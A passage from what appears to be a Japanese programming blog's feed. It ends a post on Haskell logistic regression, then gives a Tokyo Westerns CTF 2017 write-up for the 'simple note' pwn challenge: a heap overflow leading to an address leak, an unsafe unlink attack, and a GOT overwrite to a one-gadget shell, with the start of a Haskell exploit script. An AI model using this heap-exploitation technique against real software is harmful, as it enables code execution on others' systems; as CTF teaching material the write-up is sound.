<p>ある入力データ <span class="math inline">\tilde{\boldsymbol{x}}</span> が与えられたとき、それが <span class="math inline">C_1</span> に属する確率を <span class="math inline">p(1 | \tilde{\boldsymbol{x}})</span>、そうでない確率を <span class="math inline">p(0 | \tilde{\boldsymbol{x}})</span> とし、次のように定めます。このように、ある線形関数 <span class="math inline">y</span> をロジスティック関数で変形したモデルのことを一般化線形モデルと呼ぶらしいです。</p>
<p><span class="math display">
\begin{aligned}
  p(1 | \tilde{\boldsymbol{x}}) &amp;= f (\tilde{\boldsymbol{x}}) = \sigma (y (\tilde{\boldsymbol{x}})) = \frac{1}{1 + \exp (- y (\tilde{\boldsymbol{x}}))} \\
  p(0 | \tilde{\boldsymbol{x}}) &amp;= 1 - p(1 | \tilde{\boldsymbol{x}})
\end{aligned}
</span></p>
<p>では、学習データ <span class="math inline">\tilde{\boldsymbol{X}}</span>、目的ベクトル <span class="math inline">\boldsymbol{t}</span>、識別関数 <span class="math inline">y (\tilde{\boldsymbol{x}})</span> が次のように与えられたときのパラメータベクトル <span class="math inline">\tilde{\boldsymbol{w}}</span> を求めていきます。</p>
<p><span class="math display">
\begin{aligned}
  \tilde{\boldsymbol{X}} &amp;= (\tilde{\boldsymbol{x}}_1, \dots, \tilde{\boldsymbol{x}}_N)^\top \\
         \boldsymbol{t}  &amp;= (t_1, \dots, t_N)^\top \quad
             t_n =
               \begin{cases}
                 1,  &amp; \tilde{\boldsymbol{x}}_n \in C_1 \\
                 0,  &amp; \tilde{\boldsymbol{x}}_n \in C_2
               \end{cases} \\
  y (\tilde{\boldsymbol{x}}) &amp;= \tilde{\boldsymbol{w}}^\top \tilde{\boldsymbol{x}}
\end{aligned}
</span></p>
<p>まず、先ほど示した確率の式は、次のようにも書けるので</p>
<p><span class="math display">
p(y | \tilde{\boldsymbol{x}}) = (f (\tilde{\boldsymbol{x}}))^y (1 - f(\tilde{\boldsymbol{x}}))^{1 - y}
</span></p>
<p>尤度関数 <span class="math inline">L (\tilde{\boldsymbol{w}})</span> と対数尤度 <span class="math inline">\log L (\tilde{\boldsymbol{w}})</span> を次のように表すことができます。</p>
<p><span class="math display">
\begin{aligned}
  L (\tilde{\boldsymbol{w}}) &amp;= \prod_{i = 1}^{N} p (t_i | \tilde{\boldsymbol{x}}_i)  \\
                     &amp;= \prod_{i = 1}^{N} (f (\tilde{\boldsymbol{x}}_i))^{t_i} (1 - f(\tilde{\boldsymbol{x}}_i))^{1 - t_i} \\
  \log L (\tilde{\boldsymbol{w}}) &amp;= \sum_{i = 1}^{N} t_i \log f (\tilde{\boldsymbol{x}}_i)
                              + (1 - t_i) \log (1 - f(\tilde{\boldsymbol{x}}_i))
\end{aligned}
</span></p>
<p>この対数尤度が最大となるような <span class="math inline">\tilde{\boldsymbol{w}}</span> を求めることができれば良さそうです。</p>
<p>ということで、まずは <span class="math inline">\sigma (x)</span> を求める <code>sigmoid</code> と、それをベクトル・行列に適用する <code>sigmoid'</code> 関数をこんな感じに実装しました。<a href="https://hackage.haskell.org/package/hmatrix-0.18.1.0/docs/Numeric-LinearAlgebra-Data.html#v:cmap"><code>cmap</code></a> は、ベクトルや行列の全要素に任意の関数を適用できる関数です。</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb7-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ot">sigmoid ::</span> <span class="dt">Floating</span> a <span class="ot">=&gt;</span> a <span class="ot">-&gt;</span> a</span>
<span id="cb7-2"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb7-2" aria-hidden="true" tabindex="-1"></a>sigmoid x <span class="ot">=</span> <span class="fl">1.0</span> <span class="op">/</span> (<span class="fl">1.0</span> <span class="op">+</span> <span class="fu">exp</span> (<span class="op">-</span>x))</span>
<span id="cb7-3"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-4"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ot">sigmoid' ::</span> (<span class="dt">Container</span> c e, <span class="dt">Floating</span> e) <span class="ot">=&gt;</span> c e <span class="ot">-&gt;</span> c e</span>
<span id="cb7-5"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb7-5" aria-hidden="true" tabindex="-1"></a>sigmoid' <span class="ot">=</span> cmap sigmoid</span></code></pre></div>
<p>パラメータベクトルは最小二乗法では求められない？ようなので、hmatrix-gsl パッケージの <a href="https://hackage.haskell.org/package/hmatrix-gsl-0.18.0.1/docs/Numeric-GSL-Minimization.html#v:minimizeVD"><code>minimizeVD</code></a> 関数を使って最急降下法で近似的に求めることにしました。</p>
<p>今回は最大化をしたいので、最小化したい関数には対数尤度に <span class="math inline">- 1</span> を掛けたものを</p>
<p><span class="math display">
\begin{aligned}
  ll (\tilde{\boldsymbol{w}}) &amp;= - \log L (\tilde{\boldsymbol{w}}) \\
                      &amp;= - \sum_{i = 1}^{N} t_i \log f (\tilde{\boldsymbol{x}}_i)
                         + (1 - t_i) \log (1 - f(\tilde{\boldsymbol{x}}_i))       \\
                      &amp;= - \boldsymbol{t}^\top \log \boldsymbol{f} (\tilde{\boldsymbol{X}})
                         - (\boldsymbol{1} - \boldsymbol{t}) ^ \top \log (\boldsymbol{1} - \boldsymbol{f} (\tilde{\boldsymbol{X}}))
\end{aligned}
</span></p>
<p>勾配は、<span class="math inline">\sigma' (a) = \sigma (a) (1 - \sigma (a))</span> を用いて</p>
<p><span class="math display">
\begin{aligned}
  \frac{\partial ll (\tilde{\boldsymbol{w}})}{\partial \tilde{\boldsymbol{w}}} &amp;=
       - \sum_{i = 1}^{N} \Big(\frac{t_i}{f (x_i)} - \frac{1 - t_i}{1 - f (x_i)} \Big)
           f (x_i) (1 - f (x_i)) \frac{\partial}{\partial \tilde{w}_i} \tilde{w}_i \tilde{x}_i  \\
    &amp;= - \sum_{i = 1}^{N} (t_i (1 - f (x_i)) - (1 - t_i) f (x_i)) x_i \\
    &amp;= - \sum_{i = 1}^{N} (t_i - f (x_i)) x_i \\
    &amp;= \tilde{\boldsymbol{X}}^\top (\boldsymbol{f} (\tilde{\boldsymbol{X}}) - \boldsymbol{t})
\end{aligned}
</span></p>
<p>求めた2つの関数と適当なパラメータをこんな感じで渡してやります。</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb8-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> f   x   w <span class="ot">=</span> sigmoid' (x <span class="op">#&gt;</span> w)</span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-2" aria-hidden="true" tabindex="-1"></a>    ll  x y w <span class="ot">=</span> <span class="op">-</span>y <span class="op">&lt;.&gt;</span> <span class="fu">log</span> (f x w) <span class="op">-</span> (<span class="dv">1</span> <span class="op">-</span> y) <span class="op">&lt;.&gt;</span> <span class="fu">log</span> (<span class="dv">1</span> <span class="op">-</span> f x w)</span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-3" aria-hidden="true" tabindex="-1"></a>    dll x y w <span class="ot">=</span> tr x <span class="op">#&gt;</span> (f x w <span class="op">-</span> y)</span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-5" aria-hidden="true" tabindex="-1"></a>    (mw, p)  <span class="ot">=</span> minimizeVD <span class="dt">SteepestDescent</span> <span class="fl">10e-3</span> <span class="dv">3000</span> <span class="fl">10e-4</span> <span class="fl">10e-4</span></span>
<span id="cb8-6"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-6" aria-hidden="true" tabindex="-1"></a>                  (ll mx mt)</span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-7" aria-hidden="true" tabindex="-1"></a>                  (dll mx mt)</span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb8-8" aria-hidden="true" tabindex="-1"></a>                  (vector [<span class="dv">1</span>, <span class="dv">1</span>, <span class="dv">1</span>])</span></code></pre></div>
<p>最終的なコードは<a href="https://gist.github.com/Tosainu/02784b8e1233158436e623633a2b50b5">これ</a>で、出力された <code>logistic.svg</code> はこんな感じになりました。最小二乗法のときに発生した境界線の傾きはなく、いい感じに線が引けました。</p>
<figure>
<img src="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/logistic.svg" alt="logistic" />
<figcaption aria-hidden="true">logistic</figcaption>
</figure>
<h2 id="まとめ">まとめ</h2>
<p>Haskell で、2次元の線形分類器を最小二乗法、ロジスティック回帰の2手法で実装してみました。コードの実装とブログ記事にまとめる作業を通して、特にロジスティック回帰にあったモヤモヤを解決できたのは良かったなという感じです。</p>
<p>最終的には MNIST みたいな有名なデータセットを分類してみたりしたかったのですが、時間がなさそうなので断念。他クラス分類、パーセプトロン、SVM 等も一度実装してみたいけど…</p>
<h2 id="参考文献">参考文献</h2>
<ul>
<li>機械学習・パターン認識論 講義資料</li>
<li><a href="http://global.oup.com/booksites/content/0199268010/samplesec3">Least squares in matrix form</a></li>
<li><a href="https://en.wikipedia.org/wiki/Generalized_inverse">Generalized inverse - Wikipedia</a></li>
<li><a href="http://ufldl.stanford.edu/tutorial/supervised/LogisticRegression/">Unsupervised Feature Learning and Deep Learning Tutorial</a></li>
</ul>]]></summary>
</entry>
<entry>
    <title>Tokyo Westerns CTF 3rd 2017: simple note</title>
    <link href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/index.html" />
    <id>https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/index.html</id>
    <published>2017-09-04T14:51:00Z</published>
    <updated>2017-09-04T14:51:00Z</updated>
    <summary type="html"><![CDATA[<p><a href="https://ctftime.org/event/474">Tokyo Westerns CTF 3rd 2017</a> に1人チーム <a href="https://ctftime.org/team/32588">poepoe</a> で参加してました。</p>
<ul>
<li>Welcome!! (Misc 11)</li>
<li><a href="https://gist.github.com/db8dd0373c0a411333423d75ad53d7e7">Just do it! (Pwn 23)</a></li>
<li><a href="https://gist.github.com/b9e72a87ee5a1e4b1cb89ce256019470">Palindromes Pairs - Coding Phase - (PPC 24)</a></li>
<li><a href="https://gist.github.com/4930863a73f04c593771043ea966f27e">Rev Rev Rev (Reverse 25)</a></li>
<li>simple note (Pwn 86)</li>
</ul>
<p>の 169 pts で 161 位。</p>
<p>simple note 解けたのがすごく嬉しかった。<br />
とはいえ時間掛けすぎているので、もう少しサクッと解けるようにしていきたいところ。</p>
<!--more-->
<h2 id="simple-note-pwn-86">simple note <small>(Pwn 86)</small></h2>
<p>x86-64 の ELF。libc 配布有り。</p>
<pre><code>$ file simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b 
simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9976eff277e9b1fef5ebe60277ea7eb90a17625e, not stripped

$ checksec -f simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes	0		2simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b</code></pre>
<p>タイトルの通り、よくあるノート管理する系のやつ。</p>
<pre><code>$ ./simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b 
======================
1. add a new note
2. delete the note
3. show the note
4. edit the note
5. exit
======================
Your choice: </code></pre>
<p>主な機能はこんな感じ。</p>
<ol type="1">
<li>add a new note
<ul>
<li>指定されたサイズ (<code>size &gt; 0x7f</code>) の領域を<code>malloc</code>で確保する</li>
<li>領域のアドレスを配列<code>list</code>の空いているところに格納する</li>
<li>確保した領域に<code>read</code>で指定されたサイズ分読み込む</li>
</ul></li>
<li>delete the note
<ul>
<li>指定された領域を<code>free</code>する</li>
<li>対応する<code>list</code>の要素を<code>NULL</code>にする</li>
</ul></li>
<li>show the note
<ul>
<li>指定された領域を<strong><code>puts</code>で表示する</strong></li>
</ul></li>
<li>edit the note
<ul>
<li>指定された領域に<strong><code>strlen</code>の返した文字数分<code>read</code>で上書きする</strong></li>
</ul></li>
</ol>
<p>“4. edit the note” で<code>strlen</code>した文字数も読めるので、バッファを全て埋めておけば<strong>隣のチャンクの<code>size</code>が書き換え可能</strong>になる。これを利用し、<code>free</code>済みチャンクの<code>size</code>書き換え ➡ unsafe unlink attack ➡ GOT overwrite という感じで解いた。</p>
<h3 id="アドレスのリーク">アドレスのリーク</h3>
<p>まず4つの領域を確保し (buffer 0~3、そのチャンクを chunk 0~3 とする)、buffer 2、buffer 0 の順で解放するとこんな感じになる。</p>
<pre><code> main_arena   +-----------------------------------------+
|          |  |  +--------------------+                 |
|    top   |&lt;-+  |                    |                 |
|          |  |  |  +-chunk 0---+     |  +-chunk 2---+  |
|  bins[0] |-----|-&gt;| prev_size |&lt;-+  +-&gt;| prev_size |  |
|  bins[1] |-----+  | size      |  |  |  | size      |  |
|          |  |     | fd        |-----+  | fd        |--+
|          |  +-----| bk        |  +-----| bk        |
|          |        +-----------+        +-----------+</code></pre>
<p>この状態で同じサイズの領域を2つ<code>malloc</code>すると、chunk 2、chunk 0 の順で返される。ここで、<code>malloc</code>が返すアドレスはチャンクの<code>fd</code>に相当し、また<code>fd</code>や<code>bk</code>の値は<code>malloc</code>が返すときにクリアされるわけではないので、リークさせることが可能である。最終的な攻撃スクリプトでは、新たに確保する領域に 8 bytes の文字列を書き込み、続く<code>bk</code>の値を読むことで heap および libc のアドレスを求めた。</p>
<p><code>main_arena</code>のシンボルはエクスポートされていないので、配布された libc からオフセットを求めるのは少し苦戦した。今回は <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l4686"><code>__libc_mallinfo</code></a> のように<code>main_arena</code>のアドレスを参照している関数のディスアセンブル結果を見ることで求めたけど、もっといい感じの方法とかあったりするのだろうか…</p>
<pre><code>$ r2 -A libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71
[0x00020950]&gt; s sym.__libc_mallinfo 
[0x00086e70]&gt; pdf
            ;-- mallinfo:
┌ (fcn) sym.__libc_mallinfo 279
│   sym.__libc_mallinfo ();
│           ; var int local_8h @ rsp+0x8
│           ; var int local_10h @ rsp+0x10
│           ; var int local_18h @ rsp+0x18
│           ; var int local_20h @ rsp+0x20
│           0x00086e70      4156           push r14
│           0x00086e72      4155           push r13
│           0x00086e74      4989fe         mov r14, rdi
│           0x00086e77      4154           push r12
│           0x00086e79      55             push rbp
│           0x00086e7a      53             push rbx
│           0x00086e7b      4883ec30       sub rsp, 0x30               ; '0'
│           0x00086e7f      8b05bfd23300   mov eax, dword [0x003c4144] ; [0x3c4144:4]=-1
│           0x00086e85      85c0           test eax, eax
│       ┌─&lt; 0x00086e87      0f88f3000000   js 0x86f80
│       │      ; JMP XREF from 0x00086f85 (sym.__libc_mallinfo)
│      ┌──&gt; 0x00086e8d      488d2d8cdc33.  lea rbp, qword 0x003c4b20    ; &lt;- main_arena!!
│      |│   0x00086e94      48c704240000.  mov qword [rsp], 0
│      |│   0x00086e9c      48c744240800.  mov qword [local_8h], 0
│      |│   0x00086ea5      48c744241000.  mov qword [local_10h], 0
...</code></pre>
<h3 id="unsafe-unlink-attack">unsafe unlink attack</h3>
<p>glibc は、よく知られた unlink attack を<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l1414">こんな感じのチェック</a>をすることで防いでいる。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* Take a chunk off a bin list */</span></span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define unlink(AV, P, BK, FD) {                                            \</span></span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="pp">    FD = P-&gt;fd;								      \</span></span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="pp">    BK = P-&gt;bk;								      \</span></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="pp">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span>
<span id="cb5-6"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="pp">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span></span>
<span id="cb5-7"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="pp">...</span></span></code></pre></div>
<p>しかし、ある解放済みチャンク<code>P</code>の<code>fd</code>、<code>bk</code>が書き換え可能であり、かつアドレスが推測可能な領域<code>X</code>が<code>P</code>を指しているとき、</p>
<ul>
<li><code>P-&gt;fd = X - 0x18</code></li>
<li><code>P-&gt;bk = X - 0x10</code></li>
</ul>
<p>とすることで、このチェックを回避できる<a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>。これを unsafe unlink attack というらしい。</p>
<p>さて、今回のプログラムは確保した領域を配列<code>list</code>で管理している。なんとかして<code>list</code>を書き換えることができれば、任意のアドレスの書き換えが可能になる。<br />
そこでまず、<code>list</code>の要素が<strong>チャンクの先頭を指す</strong>ような状況を作り出す。3つの領域 (0x88, 0xf8, 0x88 bytes、buffer 4~6 とする) を確保し、buffer 5 を解放しておく。</p>
<figure>
<img src="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/1.svg" alt="heap1" />
<figcaption aria-hidden="true">heap1</figcaption>
</figure>
<p>この状態で buffer 4 から 0x88 + 1 bytes 書き込み、chunk 5 の<code>size</code>を 0x101 から 0x1f1 に書き換える。</p>
<figure>
<img src="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/2.svg" alt="heap2" />
<figcaption aria-hidden="true">heap2</figcaption>
</figure>
<p>そのあと2つの領域 (0x108, 0x88 bytes、buffer 5, 7 とする) を確保すると、<code>size</code>を偽装したチャンクが切り分けられ、こんな感じになる。このとき、<strong>buffer 6 を指している<code>list[6]</code>が chunk 7 の先頭も指すことになる</strong>。</p>
<figure>
<img src="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/3.svg" alt="heap3" />
<figcaption aria-hidden="true">heap3</figcaption>
</figure>
<p>こうしてできた buffer 5 と buffer 7 を使って、unsafe unlink attack を行う。今回のプログラムでは解放済みの領域に書き込むことは難しいので、chunk 7 の<code>fd</code>、<code>bk</code>をセットし、さらに後ろのチャンクの<code>PREV_INUSE</code>ビットをクリアして解放されたことにする。</p>
<figure>
<img src="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/4.svg" alt="heap3" />
<figcaption aria-hidden="true">heap3</figcaption>
</figure>
<p>このあと buffer 5 の解放をすると、<code>list[6]</code>が<code>list[3]</code>を指すようになる。</p>
<p>この状態から buffer 6 に書き込むつもりで<code>list[3]</code>を<code>puts</code>の GOT に書き換え、続けて buffer 3 に書き込むつもりで<code>puts</code>の GOT を one-gadget RCE に向けることでシェルを取ることができた。</p>
<h3 id="exploit">exploit!</h3>
<p>最終的なスクリプトと実行結果は次の通り。</p>
<p>問題サーバの libc (Ubuntu 16.04) ではチャンクの<code>size</code>と隣のチャンクの<code>prev_size</code>が一致するかのチェックをしていて刺さらなかったので、ダミーの<code>prev_size</code>を書き込む処理も追加している。(この関係で一部のインデックスが変わっている)<br />
僕には glibc のソースから該当する部分を見つけられなかったのだけど、どこにあるのだろう?</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb6-1"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#!/usr/bin/env stack</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co">-- stack --stack-yaml ./stack.yaml runghc --package pwn</span></span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ot">{-# LANGUAGE OverloadedStrings #-}</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Control.Monad</span></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Data.Bits</span></span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="kw">qualified</span> <span class="dt">Data.ByteString.Char8</span> <span class="kw">as</span> <span class="dt">BS</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Data.Maybe</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Data.Monoid</span>           ((&lt;&gt;))</span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Numeric</span>               (showHex)</span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-13"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="co">-- https://github.com/Tosainu/pwn.hs</span></span>
<span id="cb6-14"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Pwn</span></span>
<span id="cb6-15"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-16"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="ot">showByteString ::</span> (<span class="dt">Show</span> a) <span class="ot">=&gt;</span> a <span class="ot">-&gt;</span> <span class="dt">BS.ByteString</span></span>
<span id="cb6-17"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-17" aria-hidden="true" tabindex="-1"></a>showByteString <span class="ot">=</span> BS.pack <span class="op">.</span> <span class="fu">show</span></span>
<span id="cb6-18"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-19"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb6-20"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-20" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-21"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-21" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- r &lt;- remote &quot;192.168.122.10&quot; 4000</span></span>
<span id="cb6-22"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-22" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- let libc_main_arena' = 0x3a5620</span></span>
<span id="cb6-23"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-23" aria-hidden="true" tabindex="-1"></a>  <span class="co">--     libc_one_gadget' = 0x41374</span></span>
<span id="cb6-24"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-25"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-25" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- r &lt;- remote &quot;172.17.0.2&quot; 4000</span></span>
<span id="cb6-26"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-26" aria-hidden="true" tabindex="-1"></a>  r <span class="ot">&lt;-</span> remote <span class="st">&quot;pwn1.chal.ctf.westerns.tokyo&quot;</span> <span class="dv">16317</span></span>
<span id="cb6-27"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-27" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> libc_main_arena' <span class="ot">=</span> <span class="bn">0x003c4b20</span></span>
<span id="cb6-28"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-28" aria-hidden="true" tabindex="-1"></a>      libc_one_gadget' <span class="ot">=</span> <span class="bn">0x4526a</span></span>
<span id="cb6-29"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-30"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-30" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> list      <span class="ot">=</span> <span class="bn">0x006020c0</span></span>
<span id="cb6-31"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-32"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-32" aria-hidden="true" tabindex="-1"></a>      puts_got  <span class="ot">=</span> <span class="bn">0x00602020</span></span>
<span id="cb6-33"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-34"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-34" aria-hidden="true" tabindex="-1"></a>      addNote size str <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-35"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-35" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-36"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-36" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;1&quot;</span></span>
<span id="cb6-37"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-37" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the size: \n&quot;</span></span>
<span id="cb6-38"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-38" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString size</span>
<span id="cb6-39"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-39" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input your note: \n&quot;</span></span>
<span id="cb6-40"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-40" aria-hidden="true" tabindex="-1"></a>        send r str</span>
<span id="cb6-41"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-42"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-42" aria-hidden="true" tabindex="-1"></a>      deleteNote idx <span class="ot">=</span> <span class="kw">do</span></span>
